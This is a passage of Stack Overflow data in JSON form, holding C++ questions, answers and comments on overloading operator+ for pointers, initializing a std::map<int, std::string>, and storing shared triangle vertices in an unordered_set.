"https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 6, "creation_date": 1429723056, "post_id": 29804613, "comment_id": 47737002, "body": "Just dereference those pointers when calling the overloaded operator: <code>*c=*a+*b;</code> You cannot overload global operators for intrinsic types like pointers."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 0, "creation_date": 1429723357, "post_id": 29804613, "comment_id": 47737183, "body": "You likely want to overload <code>A &amp;operator+=(const A&amp; a)</code> - <code>A &amp;operator+(const A&amp; a)</code> is likely wrong"}, {"owner": {"reputation": 52656, "user_id": 225074, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/dea26ac1ef8259140d28aa8b5ba4f1b3?s=128&d=identicon&r=PG", "display_name": "Thomas Matthews", "link": "https://stackoverflow.com/users/225074/thomas-matthews"}, "edited": false, "score": 0, "creation_date": 1429724547, "post_id": 29804613, "comment_id": 47738044, "body": "Are you adding pointers or the objects they are pointing to?  Adding pointers doesn&#39;t make sense.  Adding a scalar quantity to a pointer is more sensible."}, {"owner": {"reputation": 155, "user_id": 4464750, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/c37102222b80012ba96de653cf2aa4b3?s=128&d=identicon&r=PG&f=1", "display_name": "flaviumanica", "link": "https://stackoverflow.com/users/4464750/flaviumanica"}, "reply_to_user": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1429729420, "post_id": 29804613, "comment_id": 47741172, "body": "I want to add the objects they are pointing to. @\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6 &#39;s idea is the only one that works so far; I understand there&#39;s no way to have c=a+b,without dereferencing."}, {"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1429729553, "post_id": 29804613, "comment_id": 47741259, "body": "@flaviumanica <i>&quot;I understand there&#39;s no way to have c=a+b,without dereferencing.&quot;</i> That&#39;s exactly my point, there&#39;s no other way."}], "answers": [{"comments": [{"owner": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 0, "creation_date": 1429783325, "post_id": 29807116, "comment_id": 47766579, "body": "the assignment operator observation is a bit of a red herring. Given <code>class Foo{}; Foo a; int b; b =a ;</code>  you can&#39;t overload the assignment operator for <code>int</code> but you can add <code>Foo::operator int</code> instead."}, {"owner": {"reputation": 620, "user_id": 4575304, "user_type": "registered", "profile_image": "https://graph.facebook.com/864249376951568/picture?type=large", "display_name": "Mel Viso Martinez", "link": "https://stackoverflow.com/users/4575304/mel-viso-martinez"}, "reply_to_user": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 0, "creation_date": 1429788975, "post_id": 29807116, "comment_id": 47770639, "body": "@MSalters what I attempt to explain is that since the assigment operator only can be overrided as member of any class, the expression x=y must hold a lvalue (x) with class type not pointer type. May be the override of the assignment operator is not necessary at all."}, {"owner": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 1, "creation_date": 1429790942, "post_id": 29807116, "comment_id": 47772134, "body": "Then I understood you correctly. The logic is still flawed. The expression ` x=y` is also valid when <code>x</code> is an lvalue of pointer type, and <code>y</code> is a class type whose class has a conversion to the (pointer) type of <code>x</code> (or possibly less cv-qualified)."}, {"owner": {"reputation": 620, "user_id": 4575304, "user_type": "registered", "profile_image": "https://graph.facebook.com/864249376951568/picture?type=large", "display_name": "Mel Viso Martinez", "link": "https://stackoverflow.com/users/4575304/mel-viso-martinez"}, "reply_to_user": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 0, "creation_date": 1429793138, "post_id": 29807116, "comment_id": 47773972, "body": "I review the question, and you are right. I read too fast and understood that he wanted to overload also the assignment operator ... my bad ..."}, {"owner": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 1, "creation_date": 1429796748, "post_id": 29807116, "comment_id": 47777072, "body": "Actually, the <code>operator+</code> presented here has a similar problem: at least one of the two arguments has to have class type."}, {"owner": {"reputation": 620, "user_id": 4575304, "user_type": "registered", "profile_image": "https://graph.facebook.com/864249376951568/picture?type=large", "display_name": "Mel Viso Martinez", "link": "https://stackoverflow.com/users/4575304/mel-viso-martinez"}, "reply_to_user": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 0, "creation_date": 1429799599, "post_id": 29807116, "comment_id": 47779401, "body": "@MSalters, you are right! I&#39;m very confused. I remember to do things like that in my old LCIII with Symantec C++ twenty years ago. It&#39;s possible that new standards changed that?"}, {"owner": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 1, "creation_date": 1429799697, "post_id": 29807116, "comment_id": 47779476, "body": "It&#39;s been illegal since the first C++98 standard, 17 years ago."}, {"owner": {"reputation": 620, "user_id": 4575304, "user_type": "registered", "profile_image": "https://graph.facebook.com/864249376951568/picture?type=large", "display_name": "Mel Viso Martinez", "link": "https://stackoverflow.com/users/4575304/mel-viso-martinez"}, "reply_to_user": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 0, "creation_date": 1429800105, "post_id": 29807116, "comment_id": 47779797, "body": "But the first commercial version was in october 1985 ... ok. I&#39;ve used C++ before standard... ;) ... I rewrite my comment. Thanks!"}], "tags": [], "owner": {"reputation": 620, "user_id": 4575304, "user_type": "registered", "profile_image": "https://graph.facebook.com/864249376951568/picture?type=large", "display_name": "Mel Viso Martinez", "link": "https://stackoverflow.com/users/4575304/mel-viso-martinez"}, "is_accepted": false, "score": 0, "last_activity_date": 1429800215, "last_edit_date": 1429800215, "creation_date": 1429730994, "answer_id": 29807116, "question_id": 29804613, "link": "https://stackoverflow.com/questions/29804613/overloading-operator-with-pointers/29807116#29807116", "title": "Overloading operator+ with pointers", "body": "<p>The assignment operator is a special member method (see <a href=\"http://en.cppreference.com/w/cpp/language/operators\" rel=\"nofollow\">http://en.cppreference.com/w/cpp/language/operators</a> and <a href=\"http://en.cppreference.com/w/cpp/language/as_operator\" rel=\"nofollow\">http://en.cppreference.com/w/cpp/language/as_operator</a>) and C++ dont allow operator override over pointers after his first standard (before, some implementations allow to do that).</p>\n"}, {"tags": [], "owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "is_accepted": false, "score": 0, "last_activity_date": 1429782507, "creation_date": 1429782507, "answer_id": 29819745, "question_id": 29804613, "link": "https://stackoverflow.com/questions/29804613/overloading-operator-with-pointers/29819745#29819745", "title": "Overloading operator+ with pointers", "body": "<p>I know that my following suggestion is probably not what you want, but for the sake of completeness I tried to find a solution with a template wrapper class around pointers which <em>would</em>  permit overloading operator+. I wondered what exactly the combination of lookup rules, template arguments and type conversion could achieve. It turns out that the \"natural\" use of <code>operator+</code> seems impossible, but an explicit call works. Here is my code:</p>\n\n<pre><code>/** A wrapper class around arbitrary pointer types */\ntemplate&lt;class TPtr&gt; class MyPtrT\n{\n    public:\n    TPtr ptr;\n    MyPtrT(const TPtr p = 0) :ptr(p)    \n    {}\n};\n\n/** A plus operator on all MyPtrTs */\ntemplate&lt;class T&gt; \nconst MyPtrT&lt;T&gt;&amp; \noperator+(const MyPtrT&lt;T&gt; &amp;l, const MyPtrT&lt;T&gt; &amp;r) \n{ \n    return l; \n}\n\nMyPtrT&lt;int *&gt; mp1, mp2, mp3;\nint *ip;\n</code></pre>\n\n<p>Ok, what works with these declarations?</p>\n\n<pre><code>// This works (template type explicit) ...\nmp3 = operator+&lt;int *&gt;(ip, ip);\n\n// ... and this works (of course,\n// arguments match template declaration) ...\nmp3 = mp1 + mp2;\n</code></pre>\n\n<p>And what doesn't (with gcc 4.8.3)?</p>\n\n<pre><code>mp3 = mp1 + ip;\n</code></pre>\n\n<p>The error is:</p>\n\n<pre><code>smartpointplus.cpp:33:12: error: no match for \u2018operator+\u2019 (operand types are \u2018MyPtrT&lt;int*&gt;\u2019 and \u2018int*\u2019)\n  mp3 = mp1 + ip;\n            ^\nsmartpointplus.cpp:33:12: note: candidate is:\nsmartpointplus.cpp:13:1: note: template&lt;class T&gt; const MyPtrT&lt;T&gt;&amp; operator+(const MyPtrT&lt;T&gt;&amp;, const MyPtrT&lt;T&gt;&amp;)\n operator+(const MyPtrT&lt;T&gt; &amp;l, const MyPtrT&lt;T&gt; &amp;r)\n ^\nsmartpointplus.cpp:13:1: note:   template argument deduction/substitution failed:\nsmartpointplus.cpp:33:14: note:   mismatched types \u2018const MyPtrT&lt;T&gt;\u2019 and \u2018int*\u2019\n</code></pre>\n\n<p>I'm not quite sure why the compiler doesn't construct a MyPtrT from the int* argument. It does see the proper function. Perhaps something is wrong with my ctor?</p>\n\n<pre><code>mp3 = operator+(ip, ip);\n</code></pre>\n\n<p>The error message is similar. The template function is considered but the compiler cannot convert the arguments.</p>\n\n<pre><code>smartpointplus.cpp:36:24: error: no matching function for call to \u2018operator+(int*&amp;, int*&amp;)\u2019\n  mp3 = operator+(ip, ip);\n                        ^\nsmartpointplus.cpp:36:24: note: candidate is:\nsmartpointplus.cpp:13:1: note: template&lt;class T&gt; const MyPtrT&lt;T&gt;&amp; operator+(const MyPtrT&lt;T&gt;&amp;, const MyPtrT&lt;T&gt;&amp;)\n operator+(const MyPtrT&lt;T&gt; &amp;l, const MyPtrT&lt;T&gt; &amp;r)\n ^\nsmartpointplus.cpp:13:1: note:   template argument deduction/substitution failed:\nsmartpointplus.cpp:36:24: note:   mismatched types \u2018const MyPtrT&lt;T&gt;\u2019 and \u2018int*\u2019\n  mp3 = operator+(ip, ip);\n</code></pre>\n\n<p>It's a bit sad that <code>operator+(ip, ip)</code> (automatically trying to deduce the template type) doesn't work. That limits usability ;-). One would have to templatize all functions using that operator in order to avoid providing the template type explicitly for every call. The <em>infix</em> notation below, by contrast, doesn't even consider the template operator:</p>\n\n<pre><code>mp3 = ip + ip;\n</code></pre>\n\n<p>The error message is short:</p>\n\n<pre><code>smartpointplus.cpp:38:13: error: invalid operands of types \u2018int*\u2019 and \u2018int*\u2019 to binary \u2018operator+\u2019\n  mp3 = ip + ip;\n</code></pre>\n\n<p>I always thought that infix and function style notation of operator calls are just, well, notational differences, but apparently they also change the lookup rules.</p>\n\n<p>tl;dr: What the OP wanted (an infix plus operation with pointer arguments)  doesn't work even with a template wrapping class, afaict.</p>\n"}], "owner": {"reputation": 155, "user_id": 4464750, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/c37102222b80012ba96de653cf2aa4b3?s=128&d=identicon&r=PG&f=1", "display_name": "flaviumanica", "link": "https://stackoverflow.com/users/4464750/flaviumanica"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 541, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1429800215, "creation_date": 1429722973, "question_id": 29804613, "link": "https://stackoverflow.com/questions/29804613/overloading-operator-with-pointers", "title": "Overloading operator+ with pointers", "body": "<p>I'm working on a project on polymorphism in C++ and I have lots of pointers. I need to overload the operator +, so that I can write the following expression naturally:</p>\n\n<pre><code>c=a+b;\n</code></pre>\n\n<p>with a,b and c being declared as:</p>\n\n<pre><code>A *a,*b,*c;\n</code></pre>\n\n<p>The basic overloading definitions I know are</p>\n\n<pre><code>A &amp;operator+(const A&amp; a)\nA &amp;operator=(const A&amp; a)\n</code></pre>\n\n<p>but I get the following errors:</p>\n\n<p><strong>invalid initialization of non-const reference of type 'A&amp;' from an rvalue of type 'A* const'\ninvalid operands of types 'A*' and 'A*' to binary 'operator+'</strong></p>\n\n<p>How should I write the overloaded operator so that I can call it naturally?</p>\n"}, {"tags": ["c++", "xml", "c++11", "xml-parsing"], "comments": [{"owner": {"reputation": 54818, "user_id": 962089, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/b6SVs.jpg?s=128&g=1", "display_name": "chris", "link": "https://stackoverflow.com/users/962089/chris"}, "edited": false, "score": 1, "creation_date": 1429723268, "post_id": 29804601, "comment_id": 47737121, "body": "Why &quot;1&quot;, &quot;2&quot;, etc.? Your map says <code>int</code>."}], "answers": [{"comments": [{"owner": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "edited": false, "score": 0, "creation_date": 1429723631, "post_id": 29804656, "comment_id": 47737359, "body": "Thank you for the reply. Although this get&#39;s me closer is still gives me the error: <code>src&#47;main.cpp:20:30: error: no viable conversion from &#39;mapped_type&#39; (aka       &#39;std::__1::basic_string&lt;char&gt;&#39;) to &#39;const char_t *&#39; (aka &#39;const char *&#39;)         for (auto&amp; node: doca.child(tagMap[1]).children(tagMap[2])) {                                     ^~~~~~~~~</code>"}, {"owner": {"reputation": 13337, "user_id": 4324224, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/YF2EX.png?s=128&g=1", "display_name": "W.F.", "link": "https://stackoverflow.com/users/4324224/w-f"}, "reply_to_user": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "edited": false, "score": 1, "creation_date": 1429723851, "post_id": 29804656, "comment_id": 47737520, "body": "in line 20 try: <code>auto id</code> instead of <code>const char* id</code> similarly in line 25."}, {"owner": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "edited": false, "score": 0, "creation_date": 1429723971, "post_id": 29804656, "comment_id": 47737604, "body": "That seems to give me the same error <code>src&#47;main.cpp:20:30: error: no viable conversion from &#39;mapped_type&#39; (aka &#39;std::__1::basic_string&lt;char&gt;&#39;) to       &#39;const char_t *&#39; (aka &#39;const char *&#39;)         for (auto&amp; node: doca.child(tagMap[1]).children(tagMap[2])) {</code>. Is this a related error or should I open a new question"}, {"owner": {"reputation": 54818, "user_id": 962089, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/b6SVs.jpg?s=128&g=1", "display_name": "chris", "link": "https://stackoverflow.com/users/962089/chris"}, "reply_to_user": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "edited": false, "score": 1, "creation_date": 1429723992, "post_id": 29804656, "comment_id": 47737621, "body": "@JamesWillson, I suspect those <code>child</code> and <code>children</code> functions take <code>const char *</code>. You&#39;re in luck because <a href=\"http://en.cppreference.com/w/cpp/string/basic_string\" rel=\"nofollow noreferrer\"><code>std::string</code></a> has a function to get a <code>const char *</code>."}, {"owner": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "reply_to_user": {"reputation": 54818, "user_id": 962089, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/b6SVs.jpg?s=128&g=1", "display_name": "chris", "link": "https://stackoverflow.com/users/962089/chris"}, "edited": false, "score": 0, "creation_date": 1429724057, "post_id": 29804656, "comment_id": 47737670, "body": "@chris Thank you for the reply. But I don&#39;t understand how to use std::string in this case :S"}, {"owner": {"reputation": 13337, "user_id": 4324224, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/YF2EX.png?s=128&g=1", "display_name": "W.F.", "link": "https://stackoverflow.com/users/4324224/w-f"}, "edited": false, "score": 0, "creation_date": 1429724291, "post_id": 29804656, "comment_id": 47737848, "body": "chris meant you could give it a try in yourstring.c_str()"}, {"owner": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "reply_to_user": {"reputation": 54818, "user_id": 962089, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/b6SVs.jpg?s=128&g=1", "display_name": "chris", "link": "https://stackoverflow.com/users/962089/chris"}, "edited": false, "score": 0, "creation_date": 1429724315, "post_id": 29804656, "comment_id": 47737863, "body": "@chris Like this? <code>const std::string&amp; idcs = node.child_value(tagMap[&quot;3&quot;]);</code>?"}, {"owner": {"reputation": 54818, "user_id": 962089, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/b6SVs.jpg?s=128&g=1", "display_name": "chris", "link": "https://stackoverflow.com/users/962089/chris"}, "reply_to_user": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "edited": false, "score": 0, "creation_date": 1429724325, "post_id": 29804656, "comment_id": 47737874, "body": "@JamesWillson, Just like any other class. Barring reading an article or section of a book on how to use it, you can search for APIs that meet your needs and then use those APIs. In the case of <code>std::string</code>, you&#39;re lucky because there is plenty of reading material and more than one set of documentation, compared to some libraries that have neither."}, {"owner": {"reputation": 13337, "user_id": 4324224, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/YF2EX.png?s=128&g=1", "display_name": "W.F.", "link": "https://stackoverflow.com/users/4324224/w-f"}, "edited": false, "score": 1, "creation_date": 1429724559, "post_id": 29804656, "comment_id": 47738049, "body": "I suppose rather: <code>auto idcs = node.child_value(tagMap[3].c_str());</code>"}], "tags": [], "owner": {"reputation": 13337, "user_id": 4324224, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/YF2EX.png?s=128&g=1", "display_name": "W.F.", "link": "https://stackoverflow.com/users/4324224/w-f"}, "is_accepted": true, "score": 4, "last_activity_date": 1429723282, "last_edit_date": 1429723282, "creation_date": 1429723102, "answer_id": 29804656, "question_id": 29804601, "link": "https://stackoverflow.com/questions/29804601/missing-constructor-for-initialization-for-map/29804656#29804656", "title": "Missing constructor for initialization for map", "body": "<p>Try sth like:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;map&gt;\n#include &lt;string&gt;\n\nusing namespace std;\n\nint main() {\n   std::map&lt;int, std::string&gt; tagMap {make_pair(1, \"data\"), make_pair(2, \"entry\")};\n}\n</code></pre>\n\n<p><strong>Edit:</strong> The version without make_pair function is also valid:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;map&gt;\n#include &lt;string&gt;\n\nusing namespace std;\n\nint main() {\n   std::map&lt;int, std::string&gt; tagMap {{1, \"data\"}, {2, \"entry\"}};\n}\n</code></pre>\n\n<p>The only thing you need to remember is that you shouldn't rely on compiler const string literal to number cast...</p>\n"}], "owner": {"reputation": 2097, "user_id": 2729481, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/daf7c8512fdec0bdd3c261e2d1105c62?s=128&d=identicon&r=PG&f=1", "display_name": "J.Zil", "link": "https://stackoverflow.com/users/2729481/j-zil"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1394, "favorite_count": 1, "accepted_answer_id": 29804656, "answer_count": 1, "score": 0, "last_activity_date": 1429723282, "creation_date": 1429722929, "question_id": 29804601, "link": "https://stackoverflow.com/questions/29804601/missing-constructor-for-initialization-for-map", "title": "Missing constructor for initialization for map", "body": "<p>I had some help on a previous topic, where I had to change my map to use int in combination with strings. When I have done this it gives me a different issue. This is the issue:</p>\n\n<pre><code>src/main.cpp:11:29: error: no matching constructor for initialization of\n      'std::map&lt;int, std::string&gt;'\n  ...tagMap {{\"1\", \"data\"}, {\"2\", \"entry\"}, {\"3\", \"id\"}, {\"4\", \"content\"}};\n     ^      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n</code></pre>\n\n<p>It seems like the issue (which I looked up on another topic) seems to allude to the fact that the issue is to do with making your constructor take const references? I don't really understand how to implement this. </p>\n\n<pre><code>#include \"pugi/pugixml.hpp\"\n\n#include &lt;iostream&gt;\n#include &lt;string&gt;\n#include &lt;map&gt;\n\nint main()\n{\n    pugi::xml_document doca, docb;\n    std::map&lt;std::string, pugi::xml_node&gt; mapa, mapb;\n    std::map&lt;int, std::string&gt; tagMap {{\"1\", \"data\"}, {\"2\", \"entry\"}, {\"3\", \"id\"}, {\"4\", \"content\"}};\n\n    if (!doca.load_file(\"a.xml\") || !docb.load_file(\"b.xml\")) {\n        std::cout &lt;&lt; \"Can't find input files\";\n        return 1;\n    }\n\n    for (auto&amp; node: doca.child(tagMap[1]).children(tagMap[2])) {\n        const char* id = node.child_value(tagMap[3]);\n        mapa[id] = node;\n    }\n\n    for (auto&amp; node: docb.child(tagMap[1]).children(tagMap[2])) {\n        const char* idcs = node.child_value(tagMap[3]);\n        if (!mapa.erase(idcs)) {\n            mapb[idcs] = node;\n        }\n    }\n}\n</code></pre>\n\n<p>Any help would be appreciated.</p>\n"}, {"tags": ["c++", "opengl"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 0, "creation_date": 1429722896, "post_id": 29804545, "comment_id": 47736887, "body": "Unless you get out of memory (or use too much), store the trivial structure and avoid pointers. On the other hand geometric algorithms may take advantage of knowing a point belonging to multiple triangles."}, {"owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "edited": false, "score": 1, "creation_date": 1429723007, "post_id": 29804545, "comment_id": 47736966, "body": "The question is not clear to me. An example would be of great help."}, {"owner": {"reputation": 42, "user_id": 4820449, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/dRFym.jpg?s=128&g=1", "display_name": "HamidMly", "link": "https://stackoverflow.com/users/4820449/hamidmly"}, "edited": false, "score": 0, "creation_date": 1429723271, "post_id": 29804545, "comment_id": 47737123, "body": "Thank You Mister @DieterL&#252;cking"}, {"owner": {"reputation": 42, "user_id": 4820449, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/dRFym.jpg?s=128&g=1", "display_name": "HamidMly", "link": "https://stackoverflow.com/users/4820449/hamidmly"}, "reply_to_user": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "edited": false, "score": 0, "creation_date": 1429723320, "post_id": 29804545, "comment_id": 47737154, "body": "sorry mister @Nawaz, my English is not good"}, {"owner": {"reputation": 54864, "user_id": 404970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6X94.jpg?s=128&g=1", "display_name": "molbdnilo", "link": "https://stackoverflow.com/users/404970/molbdnilo"}, "edited": false, "score": 0, "creation_date": 1429723325, "post_id": 29804545, "comment_id": 47737156, "body": "One popular solution is S3) Have a list of all unique points, store the indexes of the points in the &quot;point list&quot; and look them up when you need them (and the list should most likely not be a list but something contiguous, like a vector)."}, {"owner": {"reputation": 727, "user_id": 1350936, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/ff7821dfbdb6484287993aa9f8e35fa9?s=128&d=identicon&r=PG", "display_name": "anxieux", "link": "https://stackoverflow.com/users/1350936/anxieux"}, "edited": false, "score": 0, "creation_date": 1429723479, "post_id": 29804545, "comment_id": 47737269, "body": "I agree with @DieterL&#252;cking: it really depends on algorithms you are going to run on this data. So the simplest solution would be to prototype both approaches and measure performance (assuming performance is your main concern)."}, {"owner": {"reputation": 42, "user_id": 4820449, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/dRFym.jpg?s=128&g=1", "display_name": "HamidMly", "link": "https://stackoverflow.com/users/4820449/hamidmly"}, "edited": false, "score": 0, "creation_date": 1429723510, "post_id": 29804545, "comment_id": 47737296, "body": "Thanks Mr.@molbdnilo, but i need this ponts to creat triangle list."}], "answers": [{"tags": [], "owner": {"reputation": 3357, "user_id": 1325084, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/861cba4c57f76eb68d3249b60c72c809?s=128&d=identicon&r=PG", "display_name": "cppguy", "link": "https://stackoverflow.com/users/1325084/cppguy"}, "is_accepted": true, "score": 1, "last_activity_date": 1429724714, "creation_date": 1429724714, "answer_id": 29805218, "question_id": 29804545, "link": "https://stackoverflow.com/questions/29804545/what-is-the-best-way-between-instantiate-an-object-or-use-pointers/29805218#29805218", "title": "what is the best way between : instantiate an object or use pointers", "body": "<p>Store the points in an <code>std::unordered_set</code> then store the triangles as a list of structures containing 3 <code>std::unordered_set::const_iterator</code>'s.</p>\n\n<p>Insertion of the points into the set will be approximately constant time and the insert returns a pair that contains the iterator where the point can be found.</p>\n\n<p>Have a look <a href=\"http://www.cplusplus.com/reference/unordered_set/unordered_set/insert/\" rel=\"nofollow\">here</a> for more details on how insert works.</p>\n\n<p>Here's the basic structure of the code (untested)</p>\n\n<pre><code>struct Point\n{\n    float x;\n    float y;\n    float z;\n};\n\ntypedef std::unordered_set&lt;Point, int, hashFunc, equalsFunc&gt; pset;\n\n// Note, see http://stackoverflow.com/questions/16792751/hashmap-for-2d3d-coordinates-i-e-vector-of-doubles for more details on how to store complex structures in unordered_sets\n\nstruct RefTriangle\n{\n   pset::const_iterator p[3];\n};\n\npset allPoints;\nstd::list&lt;RefTriangle&gt; refTriangles\n\nfor (const Triangle&amp; t : triangleList)\n{\n    RefTriangle rt;\n    rt.p[0] = allPoints.insert(t.p1).first;\n    rt.p[1] = allPoints.insert(t.p2).first;\n    rt.p[2] = allPoints.insert(t.p3).first;\n    refTriangles.push_back(rt);\n}\n</code></pre>\n\n<p>In the end you'll have a set of unique points and a list of reference triangle objects that effectively have \"pointers\" to those points in the unique set.</p>\n"}], "owner": {"reputation": 42, "user_id": 4820449, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/dRFym.jpg?s=128&g=1", "display_name": "HamidMly", 